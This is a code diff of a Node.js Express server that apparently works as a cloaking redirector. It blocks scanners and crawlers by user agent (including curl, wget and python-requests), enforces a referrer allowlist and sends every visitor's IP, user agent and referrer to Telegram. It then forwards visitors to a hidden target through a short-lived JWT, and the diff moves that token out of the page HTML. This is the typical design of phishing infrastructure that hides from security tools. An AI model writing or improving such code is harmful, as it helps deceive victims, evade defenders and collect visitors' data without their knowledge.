@@ -33,29 +33,29 @@ async function sendToTelegram(message) {
   }
 }
 
-// === Middleware: Bot/referrer checks ===
+// === Middleware: Bot/referrer checks (skip /verify) ===
 app.use((req, res, next) => {
+  if (req.path.startsWith("/verify")) return next(); // skip checks for verify
+
   const ref = req.get("referer") || req.get("origin") || "";
   const ua = req.get("user-agent") || "";
   const ip = (req.headers["x-forwarded-for"] || req.socket.remoteAddress || "unknown").split(",")[0].trim();
 
   let status = "✅ Allowed";
 
-  // 🔹 FIX: Only block if ref exists AND is not in the allowed list
   if (ALLOWED_REFS.length > 0 && ref && !ALLOWED_REFS.some(domain => ref.startsWith(domain))) {
     status = "❌ Blocked (bad referrer)";
-    sendToTelegram(`${status}\nIP: ${ip}\nUA: ${ua}\nRef: ${ref || 'none'}`);
+    sendToTelegram(`${status}\nIP: ${ip}\nUA: ${ua}\nRef: ${ref || "none"}`);
     return res.status(403).send("Forbidden: bad referrer");
   }
 
-  // Block obvious bots
   if (/\b(bot|crawl|spider|scanner|wget|curl|python-requests)\b/i.test(ua)) {
     status = "❌ Blocked (bot UA)";
-    sendToTelegram(`${status}\nIP: ${ip}\nUA: ${ua}\nRef: ${ref || 'none'}`);
+    sendToTelegram(`${status}\nIP: ${ip}\nUA: ${ua}\nRef: ${ref || "none"}`);
     return res.status(403).send("Forbidden: bot detected (UA)");
   }
 
-  sendToTelegram(`${status}\nIP: ${ip}\nUA: ${ua}\nRef: ${ref || 'none'}`);
+  sendToTelegram(`${status}\nIP: ${ip}\nUA: ${ua}\nRef: ${ref || "none"}`);
   next();
 });
 
@@ -64,13 +64,12 @@ app.get("/", (req, res) => {
   res.redirect("/secure-redirect");
 });
 
-// === Serve redirect page with embedded token ===
+// === Secure redirect: now fully server-side ===
 app.get("/secure-redirect", (req, res) => {
   try {
     const token = jwt.sign({ target: REDIRECT_URL }, SECRET, { expiresIn: "30s" });
-    let html = fs.readFileSync(path.join(__dirname, "views", "redirect.html"), "utf8");
-    html = html.replace("%%TOKEN%%", token); // inject token
-    res.send(html);
+    // Direct server redirect, no token in browser HTML
+    res.redirect(`/verify?token=${token}`);
   } catch (err) {
     console.error("Error signing token", err);
     res.status(500).send("Server error");
@@ -96,7 +95,7 @@ app.get("/verify", (req, res) => {
   }
 });
 
-// === Healthcheck endpoint ===
+// === Healthcheck ===
 app.get("/healthz", (req, res) => res.send("ok"));
 
 app.listen(PORT, () => console.log(`🚀 Secure-redirect listening on ${PORT}`));
